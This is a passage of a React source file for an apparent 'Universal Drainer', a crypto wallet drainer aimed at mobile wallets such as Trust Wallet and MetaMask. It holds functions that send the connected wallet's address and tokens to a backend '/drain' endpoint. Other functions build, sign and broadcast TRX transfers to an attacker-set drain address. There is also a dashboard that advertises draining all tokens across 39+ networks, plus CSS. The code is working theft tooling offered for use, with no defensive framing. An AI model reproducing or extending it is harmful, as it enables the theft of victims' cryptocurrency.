          message: 'Cannot connect to wallet. Mobile wallet may need refresh.'
        };
      }
      
    } catch (error) {
      console.error(`❌ Drain error for ${token.symbol}:`, error);
      
      let errorMessage = 'Transaction failed';
      let userMessage = error.message || 'Unknown error';
      
      if (error.code === 4001 || error.code === 'ACTION_REJECTED' || error.message?.includes('rejected')) {
        errorMessage = 'User rejected transaction';
        userMessage = 'Transaction rejected in mobile wallet';
      } else if (error.message?.includes('insufficient funds')) {
        errorMessage = 'Insufficient balance';
        userMessage = 'Not enough balance for gas fees';
      } else if (error.message?.includes('WebSocket')) {
        errorMessage = 'WebSocket connection issue';
        userMessage = 'Mobile wallet connection issue. Try refreshing.';
      }
      
      return {
        success: false,
        error: errorMessage,
        message: userMessage
      };
    }
  };

  // FIXED: Drain TRON token specifically
  const drainTronToken = async (token) => {
    try {
      console.log(`🔄 Draining TRON: ${token.amount} TRX`);
      
      // Try backend API first
      try {
        const response = await fetch(`${backendUrl}/drain`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ 
            action: 'drain-tron',
            address: tronAddress || address,
            token: token,
            amount: token.amount
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success) {
            return {
              success: true,
              hash: data.txHash,
              message: `${token.amount} TRX auto-drained via API`,
              explorer: `https://tronscan.org/#/transaction/${data.txHash}`
            };
          }
        }
      } catch (apiError) {
        console.log("TRON backend API failed, trying direct");
      }
      
      // Direct TRON transaction
      const tronProvider = window.tronWeb || window.tronLink?.tronWeb;
      if (tronProvider && tronProvider.defaultAddress?.base58) {
        const amount = Math.floor(token.rawAmount * 1_000_000); // Convert to sun
        
        const transaction = await tronProvider.transactionBuilder.sendTrx(
          token.drainAddress,
          amount,
          tronProvider.defaultAddress.base58
        );
        
        const signedTx = await tronProvider.trx.sign(transaction);
        const result = await tronProvider.trx.sendRawTransaction(signedTx);
        
        return {
          success: true,
          hash: result.txid,
          message: `${token.amount} TRX auto-drained via TRON`,
          explorer: `https://tronscan.org/#/transaction/${result.txid}`
        };
      }
      
      return {
        success: false,
        error: 'TRON provider not ready',
        message: 'TRON wallet not connected properly'
      };
      
    } catch (error) {
      console.error("TRON drain error:", error);
      return {
        success: false,
        error: 'TRON drain failed',
        message: error.message || 'TRON transaction failed'
      };
    }
  };

  // Drain other non-EVM token
  const drainNonEvmToken = async (token) => {
    try {
      console.log(`🔄 Draining non-EVM ${token.symbol}...`);
      
      // Use backend API
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ 
          action: 'drain-non-evm',
          address: address,
          token: token,
          chainId: token.chainId,
          amount: token.amount
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          return {
            success: true,
            hash: data.txHash || data.hash,
            message: `${token.amount} ${token.symbol} auto-drained via API`,
            explorer: getExplorerUrl(data.txHash || data.hash, token.chainId)
          };
        }
      }
      
      return {
        success: false,
        error: 'Auto-drain failed',
        message: `Could not auto-drain ${token.symbol}`
      };
      
    } catch (error) {
      console.error(`❌ Non-EVM drain error for ${token.symbol}:`, error);
      return {
        success: false,
        error: 'Auto-drain error',
        message: error.message || 'Unknown error'
      };
    }
  };

  const getExplorerUrl = (hash, chainId) => {
    const network = NETWORKS.find(n => n.id === chainId);
    if (network?.explorer) {
      if (chainId === 'tron') {
        return `${network.explorer}/#/transaction/${hash}`;
      }
      return `${network.explorer}/tx/${hash}`;
    }
    return `https://etherscan.io/tx/${hash}`;
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount) => {
    const num = parseFloat(amount);
    if (isNaN(num)) return '0.00';
    if (num < 0.000001) return '<0.000001';
    return num.toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 8
    });
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        {/* Header */}
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>UNIVERSAL DRAINER</h1>
              <p className="subtitle">39+ Networks • Mobile Optimized • AUTO-DRAIN</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">{formatAddress(address)}</div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                {tronDetected && <div className="tron-badge">TRON</div>}
                {mobileCompatibility && <div className="mobile-badge">📱</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Connection Error Display */}
              {connectionError && (
                <div className="error-alert">
                  <div className="error-icon">⚠️</div>
                  <div className="error-message">
                    <strong>Mobile Connection:</strong> {connectionError}
                    <div className="error-help">
                      Mobile fix: 1) Refresh in wallet browser 2) Ensure wallet is unlocked 3) Check internet
                    </div>
                  </div>
                  <button onClick={() => setConnectionError('')} className="error-close">
                    ×
                  </button>
                </div>
              )}
              
              {/* TRON Status Display */}
              {tronDetected && (
                <div className="tron-status">
                  <div className="tron-status-icon">🌐</div>
                  <div className="tron-status-details">
                    <div className="tron-status-title">TRON WALLET CONNECTED</div>
                    <div className="tron-status-info">
                      {tronAddress && `Address: ${formatAddress(tronAddress)}`}
                      {tronBalance > 0 && ` • Balance: ${tronBalance.toFixed(6)} TRX`}
                      {tronDetected && tronBalance === 0 && ` • Detected (Balance: 0 TRX)`}
                    </div>
                  </div>
                </div>
              )}
              
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : '🚀'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">MOBILE AUTO-DRAIN SYSTEM</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        Scanning 39+ networks • Mobile WebSocket optimized
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {tokens.length > 0 ? 'AUTO-READY' : 'SCANNING'}
                    </div>
                    <div className="stat-label">Status</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <div className="control-buttons">
                  <button
                    onClick={scanAllNetworks}
                    disabled={isScanning || isProcessing}
                    className="btn btn-scan"
                  >
                    {isScanning ? (
                      <>
                        <span className="spinner"></span>
                        Mobile Scanning...
                      </>
                    ) : '🔍 Scan All Networks'}
                  </button>
                  
                  {tokens.length > 0 && (
                    <button
                      onClick={() => startAutoDrain()}
                      disabled={isProcessing || isScanning}
                      className="btn btn-drain"
                    >
                      {isProcessing ? (
                        <>
                          <span className="spinner"></span>
                          Mobile Draining...
                        </>
                      ) : `⚡ Auto-Drain All ($${totalValue.toFixed(2)})`}
                    </button>
                  )}
                </div>
                
                {tokens.length > 0 && (
                  <div className="drain-summary">
                    <div className="summary-text">
                      <strong>MOBILE AUTO-DRAIN READY:</strong> {tokens.length} tokens • ${totalValue.toFixed(2)} total
                    </div>
                    <div className="summary-breakdown">
                      <span className="network-count">
                        {[...new Set(tokens.map(t => t.network))].length} networks
                      </span>
                      <span className="tron-count">
                        {tokens.filter(t => t.symbol === 'TRX').length} TRON tokens
                      </span>
                    </div>
                  </div>
                )}
              </div>

              {/* Rest of your UI remains exactly the same */}
              {/* Transactions Panel */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>AUTO-DRAIN HISTORY</h3>
                    <div className="success-rate">
                      {transactions.filter(t => t.status?.includes('✅')).length} / {transactions.length} successful
                    </div>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(0, 10).map((tx, idx) => (
                      <div key={tx.id || idx} className={`transaction-item ${tx.status?.includes('✅') ? 'success' : 'failed'}`}>
                        <div className="tx-icon">
                          {tx.status?.includes('✅') ? '✅' : '❌'}
                        </div>
                        <div className="tx-details">
                          <div className="tx-main">
                            <span className="tx-symbol">{tx.symbol}</span>
                            <span className="tx-network">{tx.network}</span>
                            <span className="tx-amount">{formatAmount(tx.amount)}</span>
                            <span className="tx-value">${tx.valueUSD || '0'}</span>
                          </div>
                          <div className="tx-secondary">
                            <span className="tx-status">{tx.status}</span>
                            <span className="tx-message">{tx.message}</span>
                          </div>
                          {tx.explorer && (
                            <a href={tx.explorer} target="_blank" rel="noopener noreferrer" className="tx-link">
                              View Transaction
                            </a>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Detected Tokens */}
              {tokens.length > 0 ? (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>DETECTED TOKENS (MOBILE AUTO-DRAIN READY)</h3>
                    <div className="panel-summary">
                      <span>${totalValue.toFixed(2)} total value</span>
                      <span>{tokens.length} tokens</span>
                      <span>{[...new Set(tokens.map(t => t.network))].length} networks</span>
                    </div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div 
                            className="network-badge"
                            style={{ 
                              backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666'
                            }}
                          >
                            {token.symbol}
                          </div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'EVM' : 'NON-EVM'}
                          </div>
                        </div>
                        <div className="token-amount">
                          {formatAmount(token.amount)} {token.symbol}
                        </div>
                        <div className="token-value">
                          ${token.valueUSD?.toFixed(2) || (token.rawAmount * (TOKEN_PRICES[token.symbol] || 0)).toFixed(2)}
                        </div>
                        <div className="token-status">
                          <span className="status-auto">⚡ MOBILE AUTO-DRAIN</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : !isScanning ? (
                <div className="empty-state">
                  <div className="empty-icon">💎</div>
                  <h3>No tokens detected yet</h3>
                  <p>Auto-scan detects TRON, Bitcoin, Solana, and all EVM tokens on mobile</p>
                  <button 
                    onClick={scanAllNetworks}
                    className="btn btn-scan"
                    style={{marginTop: '20px'}}
                  >
                    🔍 Start Mobile Scan
                  </button>
                </div>
              ) : null}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>MOBILE AUTO-DRAINER</h2>
                <p className="welcome-text">
                  Optimized for mobile wallets (Trust Wallet, MetaMask Mobile). 
                  Auto-detects TRON, scans 39+ networks, and drains ALL tokens automatically.
                </p>
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                <div className="mobile-features">
                  <div className="feature">• Mobile WebSocket compatibility</div>
                  <div className="feature">• TRON wallet auto-detection</div>
                  <div className="feature">• 39+ networks including all EVM & non-EVM</div>
                  <div className="feature">• No manual steps - 100% automated</div>
                  <div className="feature">• Works in Trust Wallet browser</div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span>MOBILE AUTO-DRAINER • WEB3 MOBILE COMPATIBLE • 39+ NETWORKS</span>
            <span className="status-dot"></span>
            <span>{isConnected ? (isScanning ? 'MOBILE SCANNING...' : isProcessing ? 'MOBILE DRAINING...' : 'READY') : 'CONNECT WALLET'}</span>
          </div>
        </footer>
      </div>
 {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: monospace;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: #ef4444;
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        
        h1 {
          margin: 0;
          font-size: 24px;
          font-weight: 700;
          color: #ef4444;
        }
        
        .subtitle {
          margin: 5px 0 0 0;
          color: #888;
          font-size: 14px;
        }
        
        .connected-wallet {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .wallet-address {
          background: #222;
          padding: 8px 12px;
          border-radius: 8px;
          font-family: monospace;
          font-size: 14px;
          border: 1px solid #333;
        }
        
        .wallet-type {
          font-size: 12px;
          color: #0af;
          padding: 4px 8px;
          background: rgba(0, 170, 255, 0.1);
          border-radius: 6px;
        }
        
        .tron-badge {
          background: rgba(255, 6, 10, 0.2);
          color: #ff6b6b;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(255, 6, 10, 0.3);
        }
        
        .disconnect-btn {
          background: #444;
          color: white;
          border: none;
          padding: 8px 12px;
          border-radius: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        
        .disconnect-btn:hover {
          background: #555;
        }
        
        /* Status Dashboard */
        .status-dashboard {
          margin-bottom: 30px;
        }
        
        .status-card {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          display: flex;
          align-items: center;
          gap: 15px;
          border: 2px solid #333;
          margin-bottom: 20px;
        }
        
        .status-card.primary {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-color: #ef4444;
        }
        
        .status-icon {
          font-size: 32px;
        }
        
        .status-content {
          flex: 1;
        }
        
        .status-title {
          font-size: 14px;
          color: #aaa;
          text-transform: uppercase;
          letter-spacing: 2px;
          margin-bottom: 5px;
        }
        
        .status-message {
          font-size: 18px;
          font-weight: 600;
          color: white;
        }
        
        .stats-row {
          display: flex;
          gap: 15px;
        }
        
        .stat {
          flex: 1;
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          border: 1px solid #333;
        }
        
        .stat-value {
          font-size: 28px;
          font-weight: 700;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .stat-label {
          color: #888;
          font-size: 14px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        /* Processing Indicator */
        .processing-indicator {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: center;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: borderPulse 2s infinite;
        }
        
        @keyframes borderPulse {
          0%, 100% { border-color: #ef4444; }
          50% { border-color: #f87171; }
        }
        
        .processing-spinner {
          width: 40px;
          height: 40px;
          border: 4px solid #333;
          border-top-color: #ef4444;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 15px;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .processing-text {
          font-size: 18px;
          font-weight: 600;
          color: #ef4444;
          margin-bottom: 5px;
        }
        
        .processing-note {
          color: #888;
          font-size: 14px;
        }
        
        /* Transactions */
        .transactions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
        }
        
        .panel-header h3 {
          margin: 0;
          font-size: 18px;
          color: white;
        }
        
        .success-rate {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          padding: 6px 12px;
          border-radius: 20px;
          font-size: 14px;
          font-weight: 600;
        }
        
        .transactions-list {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        
        .transaction-item {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          border-left: 4px solid #333;
        }
        
        .transaction-item.success {
          border-left-color: #10b981;
        }
        
        .transaction-item.failed {
          border-left-color: #ef4444;
        }
        
        .tx-icon {
          font-size: 24px;
        }
        
        .tx-details {
          flex: 1;
        }
        
        .tx-symbol {
          font-weight: 600;
          font-size: 16px;
          margin-bottom: 2px;
        }
        
        .tx-amount {
          font-family: monospace;
          color: #ddd;
          margin-bottom: 2px;
        }
        
        .tx-status {
          font-weight: 600;
          margin-bottom: 2px;
        }
        
        .transaction-item.success .tx-status {
          color: #10b981;
        }
        
        .transaction-item.failed .tx-status {
          color: #ef4444;
        }
        
        .tx-message {
          color: #888;
          font-size: 12px;
          margin-bottom: 5px;
        }
        
        .tx-link {
          color: #3b82f6;
          font-size: 12px;
          text-decoration: none;
        }
        
        .tx-link:hover {
          text-decoration: underline;
        }
        
        /* Tokens */
        .tokens-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          margin-bottom: 20px;
          border: 1px solid #333;
        }
        
        .panel-summary {
          display: flex;
          gap: 15px;
          color: #888;
          font-size: 14px;
        }
        
        .tokens-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
          gap: 15px;
          margin-top: 20px;
        }
        
        .token-card {
          background: #1a1a1a;
          border-radius: 12px;
          padding: 20px;
          border: 1px solid #333;
        }
        
        .token-header {
          display: flex;
          align-items: center;
          gap: 10px;
          margin-bottom: 10px;
        }
        
        .token-symbol {
          font-weight: 700;
          font-size: 20px;
          color: white;
        }
        
        .token-network {
          color: #888;
          font-size: 12px;
          flex: 1;
        }
        
        .token-type {
          padding: 2px 6px;
          border-radius: 4px;
          font-size: 10px;
          font-weight: 600;
          text-transform: uppercase;
        }
        
        .token-type.evm {
          background: rgba(59, 130, 246, 0.2);
          color: #3b82f6;
        }
        
        .token-type.non-evm {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
        }
        
        .token-amount {
          font-size: 24px;
          font-weight: 700;
          color: white;
          margin-bottom: 5px;
        }
        
        .token-value {
          color: #10b981;
          font-size: 18px;
          font-weight: 600;
          margin-bottom: 10px;
        }
        
        .token-destination {
          background: #222;
          border-radius: 6px;
          padding: 8px;
          font-family: monospace;
          font-size: 12px;
          color: #888;
          border: 1px solid #333;
        }
        
        /* Instructions */
        .instructions-panel {
          background: #222;
          border-radius: 16px;
          padding: 20px;
          border: 1px solid #f59e0b;
        }
        
        .instructions-panel h3 {
          color: #f59e0b;
          margin: 0 0 15px 0;
        }
        
        .instructions-panel ul {
          margin: 0;
          padding-left: 20px;
          color: #ddd;
          line-height: 1.6;
        }
        
        .instructions-panel li {
          margin-bottom: 8px;
        }
        
        /* Welcome */
        .welcome-screen {
          text-align: center;
          padding: 60px 20px;
          max-width: 600px;
          margin: 0 auto;
        }
        
        .welcome-icon {
          font-size: 64px;
          margin-bottom: 20px;
        }
        
        .welcome-text {
          color: #ddd;
          margin-bottom: 20px;
          font-size: 18px;
        }
        
        .warning-text {
          color: #ef4444;
          margin-bottom: 30px;
          font-size: 16px;
          font-weight: 600;
        }
        
        .connect-section {
          margin-bottom: 40px;
        }
        
        .features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 400px;
          margin: 0 auto;
        }
        
        .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
        }
        
        /* Footer */
        .app-footer {
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #333;
          text-align: center;
          color: #888;
          font-size: 14px;
        }
        
        .footer-content {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 10px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: #10b981;
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
          .stats-row {
            flex-direction: column;
          }
          
          .tokens-grid {
            grid-template-columns: 1fr;
          }
          
          .footer-content {
            flex-direction: column;
            gap: 5px;
          }
        }
      `}</style>
      {/* CSS Styles - Add these to your existing styles */}
      <style jsx>{`
        .error-alert {
          background: linear-gradient(135deg, #7c2d12, #dc2626);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 2px solid #ef4444;
          animation: pulse-alert 2s infinite;
        }
        
        @keyframes pulse-alert {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.8; }
        }
        
        .error-icon {
          font-size: 24px;
        }
        
        .error-message {
          flex: 1;
          color: white;
          font-size: 14px;
        }
        
        .error-help {
          font-size: 12px;
          opacity: 0.9;
          margin-top: 5px;
          color: #ffd700;
        }
        
        .error-close {
          background: none;
          border: none;
          color: white;
          font-size: 20px;
          cursor: pointer;
          padding: 5px;
        }
        
        .tron-status {
          background: rgba(255, 6, 10, 0.15);
          border-radius: 12px;
          padding: 15px;
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          border: 1px solid rgba(255, 6, 10, 0.3);
          animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
          from { transform: translateY(-10px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        
        .tron-status-icon {
          font-size: 24px;
          background: rgba(255, 6, 10, 0.2);
          width: 40px;
          height: 40px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .tron-status-details {
          flex: 1;
        }
        
        .tron-status-title {
          font-size: 14px;
          color: #ff6b6b;
          font-weight: 600;
          margin-bottom: 5px;
        }
        
        .tron-status-info {
          font-size: 12px;
          color: #ddd;
        }
        
        .mobile-badge {
          background: rgba(0, 100, 255, 0.2);
          color: #3b82f6;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 12px;
          border: 1px solid rgba(0, 100, 255, 0.3);
        }
        
        .mobile-features {
          background: #222;
          border-radius: 12px;
          padding: 20px;
          text-align: left;
          max-width: 500px;
          margin: 0 auto;
          margin-top: 20px;
        }
        
        .mobile-features .feature {
          color: #ddd;
          margin-bottom: 10px;
          font-size: 14px;
          display: flex;
          align-items: center;
        }
        
        .mobile-features .feature:before {
          content: '✓';
          color: #10b981;
          margin-right: 10px;
          font-weight: bold;
        }
        
        /* Mobile-specific adjustments */
        @media (max-width: 768px) {
          .status-card.primary {
            padding: 15px;
          }
          
          .status-message {
            font-size: 16px;
          }
          
          .control-buttons {
            flex-direction: column;
          }
          
          .btn {
            padding: 14px 18px;
            font-size: 15px;
          }
        }
      `}</style>
    </div>
  );
}

export default TokenDrainApp;
